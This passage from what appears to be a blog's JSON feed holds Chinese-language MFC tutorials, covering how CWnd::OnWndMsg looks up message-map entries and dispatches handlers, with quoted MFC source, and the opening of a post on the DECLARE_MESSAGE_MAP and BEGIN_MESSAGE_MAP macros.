MFC 的标准消息，也就是我们定义的要处理的消息映射和其对应的消息处理函数。</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>UINT iHash<span class=\"token punctuation\">;</span> iHash <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD_PTR<span class=\"token punctuation\">)</span>pMessageMap<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> message<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>iHashMax<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\twinMsgLock<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span>CRIT_WINMSGCACHE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tAFX_MSG_CACHE<span class=\"token operator\">*</span> pMsgCache<span class=\"token punctuation\">;</span> pMsgCache <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>_afxMsgCache<span class=\"token punctuation\">[</span>iHash<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">const</span> AFX_MSGMAP_ENTRY<span class=\"token operator\">*</span> lpEntry<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">==</span> pMsgCache<span class=\"token operator\">-></span>nMsg <span class=\"token operator\">&amp;&amp;</span> pMessageMap <span class=\"token operator\">==</span> pMsgCache<span class=\"token operator\">-></span>pMessageMap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token comment\">// cache hit</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tlpEntry <span class=\"token operator\">=</span> pMsgCache<span class=\"token operator\">-></span>lpEntry<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\twinMsgLock<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lpEntry <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token comment\">// cache hit, and it needs to be handled</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">&lt;</span> <span class=\"token number\">0xC000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token keyword\">goto</span> LDispatch<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token keyword\">goto</span> LDispatchRegistered<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token comment\">// not in cache, look for it</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tpMsgCache<span class=\"token operator\">-></span>nMsg <span class=\"token operator\">=</span> message<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tpMsgCache<span class=\"token operator\">-></span>pMessageMap <span class=\"token operator\">=</span> pMessageMap<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token comment\">/* pMessageMap already init'ed */</span><span class=\"token punctuation\">;</span> pMessageMap<span class=\"token operator\">-></span>pfnGetBaseMap <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\tpMessageMap <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pMessageMap<span class=\"token operator\">-></span>pfnGetBaseMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token comment\">// Note: catch not so common but fatal mistake!!</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token comment\">//      BEGIN_MESSAGE_MAP(CMyWnd, CMyWnd)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>pMessageMap <span class=\"token operator\">!=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pMessageMap<span class=\"token operator\">-></span>pfnGetBaseMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">&lt;</span> <span class=\"token number\">0xC000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// constant window message</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>lpEntry <span class=\"token operator\">=</span> <span class=\"token function\">AfxFindMessageEntry</span><span class=\"token punctuation\">(</span>pMessageMap<span class=\"token operator\">-></span>lpEntries<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t\t\tmessage<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t\t\tpMsgCache<span class=\"token operator\">-></span>lpEntry <span class=\"token operator\">=</span> lpEntry<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t\t\twinMsgLock<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">goto</span> LDispatch<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// registered windows message</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t\tlpEntry <span class=\"token operator\">=</span> pMessageMap<span class=\"token operator\">-></span>lpEntries<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>lpEntry <span class=\"token operator\">=</span> <span class=\"token function\">AfxFindMessageEntry</span><span class=\"token punctuation\">(</span>lpEntry<span class=\"token punctuation\">,</span> <span class=\"token number\">0xC000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t\t\tUINT<span class=\"token operator\">*</span> pnID <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>UINT<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>lpEntry<span class=\"token operator\">-></span>nSig<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pnID <span class=\"token operator\">>=</span> <span class=\"token number\">0xC000</span> <span class=\"token operator\">||</span> <span class=\"token operator\">*</span>pnID <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\t\t\t\t<span class=\"token comment\">// must be successfully registered</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pnID <span class=\"token operator\">==</span> message<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t\t\t\t\tpMsgCache<span class=\"token operator\">-></span>lpEntry <span class=\"token operator\">=</span> lpEntry<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t\t\t\t\twinMsgLock<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">goto</span> LDispatchRegistered<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t\t\t\tlpEntry<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// keep looking past this one</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\tpMsgCache<span class=\"token operator\">-></span>lpEntry <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\twinMsgLock<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这一段代码就是为了找我们  <code>AFX_MSGMAP</code>  结构中的  <code>AFX_MSGMAP_ENTRY</code>  直到其有值，然后跳转到  <code>LDispatch</code>  或  <code>LDispatchRegistered</code>  处理。</p>\n<h4 id=\"调用消息处理函数\"><a class=\"anchor\" href=\"#调用消息处理函数\">#</a> 调用消息处理函数</h4>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>message <span class=\"token operator\">&lt;</span> <span class=\"token number\">0xC000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tmmf<span class=\"token punctuation\">.</span>pfn <span class=\"token operator\">=</span> lpEntry<span class=\"token operator\">-></span>pfn<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>lpEntry<span class=\"token operator\">-></span>nSig<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>FALSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">case</span> AfxSig_l_p<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\tCPoint <span class=\"token function\">point</span><span class=\"token punctuation\">(</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\tlResult <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token operator\">-></span><span class=\"token operator\">*</span>mmf<span class=\"token punctuation\">.</span>pfn_l_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>point<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">case</span> AfxSig_b_D_v<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\tlResult <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token operator\">-></span><span class=\"token operator\">*</span>mmf<span class=\"token punctuation\">.</span>pfn_b_D<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CDC</span><span class=\"token operator\">::</span><span class=\"token function\">FromHandle</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">reinterpret_cast</span><span class=\"token operator\">&lt;</span>HDC<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>wParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">case</span> AfxSig_l_D_u<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\tlResult <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token operator\">-></span><span class=\"token operator\">*</span>mmf<span class=\"token punctuation\">.</span>pfn_l_D_u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CDC</span><span class=\"token operator\">::</span><span class=\"token function\">FromHandle</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">reinterpret_cast</span><span class=\"token operator\">&lt;</span>HDC<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>wParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  …………</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  …………</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  …………</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  …………</pre></td></tr></table></figure><p>确定了调用什么类型的函数指针，也就是确定了消息处理函数所对应的返回值和参数。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">case</span> AfxSig_v_u_p<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t\tCPoint <span class=\"token function\">point</span><span class=\"token punctuation\">(</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t<span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token operator\">-></span><span class=\"token operator\">*</span>mmf<span class=\"token punctuation\">.</span>pfn_v_u_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">static_cast</span><span class=\"token operator\">&lt;</span>UINT<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>wParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> point<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>前面已经给共用体类型的  <code>mmf</code>  变量赋值了，是  <code>OnLButtonDown</code>  函数的地址，然后调用  <code>mmf</code>  中和  <code>OnLButtonDown</code>  函数返回值和参数一样的函数指针，调用了  <code>OnLButtonDown</code>  函数。</p>\n<h2 id=\"总结-2\"><a class=\"anchor\" href=\"#总结-2\">#</a> 总结</h2>\n<p>学习这种设计思想。</p>\n<p>至此我们了解了 MFC 的消息映射机制的原理，其利用了结构体  <code>AFX_MSGM</code>   和结构体  <code>AFX_MSGMAP_ENTRY</code>  与共同体  <code>MessageMapFunctions</code>  ，来处理许许多多不同的消息处理函数。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">AFX_MSGMAP_ENTRY</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    UINT nMessage<span class=\"token punctuation\">;</span>   <span class=\"token comment\">//windows message # Windows 消息类型 ID</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    UINT nCode<span class=\"token punctuation\">;</span>      <span class=\"token comment\">//control code or WM_NOTIFY code #对于窗口消息该值为 0，处理命令消息和控件通知的函数使用与此相同的消息映像。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    UINT nID<span class=\"token punctuation\">;</span>        <span class=\"token comment\">//control ID (or 0 for windows messages) #命令消息 ID 的起始范围</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    UINT nLastID<span class=\"token punctuation\">;</span>    <span class=\"token comment\">//used for entries specifying a range of control id's #命令消息 ID 范围的终点</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    UINT nSig<span class=\"token punctuation\">;</span>       <span class=\"token comment\">//signature type (action) or pointer to message #消息的动作标识 enum AfxSig 里面的成员</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    AFX_PMSG pfn<span class=\"token punctuation\">;</span>    <span class=\"token comment\">//routine to call (or special value) #响应消息时应执行的函数</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">AFX_MSGMAP</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>PASCAL<span class=\"token operator\">*</span> pfnGetBaseMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 指向其父类的 GetThisMessageMap 的函数指针</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">const</span> AFX_MSGMAP_ENTRY<span class=\"token operator\">*</span> lpEntries<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"wm_commadwm_notify消息的处理流程\"><a class=\"anchor\" href=\"#wm_commadwm_notify消息的处理流程\">#</a> WM_COMMAD (WM_NOTIFY) 消息的处理流程</h1>\n<p>在  <code>OnWndMsg</code>  中判断了消息是否是  <code>WM_COMMAND</code>  如果是就调用  <code>OnCommand</code>  函数去处理，而 <code>OnCommand</code>  函数也是一个虚函数：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// special case for commands</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">==</span> WM_COMMAND<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">OnCommand</span><span class=\"token punctuation\">(</span>wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\tlResult <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\t<span class=\"token keyword\">goto</span> LReturnTrue<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>接下来分析一下  <code>OnCommand</code>  函数。</p>\n<p>暂时鸽了，详细参见《深入浅出 MFC》一书。</p>\n",
            "tags": [
                "MFC命令传递"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-04%E6%B6%88%E6%81%AF%E6%98%A0%E5%B0%84/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-04%E6%B6%88%E6%81%AF%E6%98%A0%E5%B0%84/",
            "title": "MFC六大核心机制-04消息映射",
            "date_published": "2022-06-01T17:27:17.000Z",
            "content_html": "<h1 id=\"什么是消息映射\"><a class=\"anchor\" href=\"#什么是消息映射\">#</a> 什么是消息映射</h1>\n<p>消息映射是 MFC 内建的一个消息分派机制，只要利用数个宏以及固定形式的写法（类似于填表格）就可以让我们的框架知道一旦消息发生，该往哪一个类去传递，每一个类只能拥有一个消息映射表格，也可以没有。</p>\n<h1 id=\"本节课需要掌握的知识点\"><a class=\"anchor\" href=\"#本节课需要掌握的知识点\">#</a> 本节课需要掌握的知识点</h1>\n<p>1、本节必须掌握的知识点</p>\n<p>三个关键的宏  <code>DECLARE_MESSAGE_MAP</code>  、  <code>BEGIN_MESSAGE_MAP</code>  和 <code>END_MESSAGE_MAP</code> <br />\n 如何添加一个消息？</p>\n<p>2、需要简单了解的内容</p>\n<p><code>AFX_MSGMAP_ENTRY</code>  结构和  <code>AFX_MSGMAP</code> <br />\n <code>MessageMapFunctions</code></p>\n<h1 id=\"消息映射\"><a class=\"anchor\" href=\"#消息映射\">#</a> 消息映射</h1>\n<p>我们来学习 MFC 消息映射的本质。</p>\n<h2 id=\"添加消息\"><a class=\"anchor\" href=\"#添加消息\">#</a> 添加消息</h2>\n<p>我们还是使用 01 中的代码为基础：</p>\n<p>Hello.h</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\">once</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">WIN32_LEAN_AND_MEAN</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;afxwin.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMyApp</span><span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CWinApp</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">virtual</span> BOOL <span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMainWindow</span> <span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CFrameWnd</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>Hello.cpp</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token 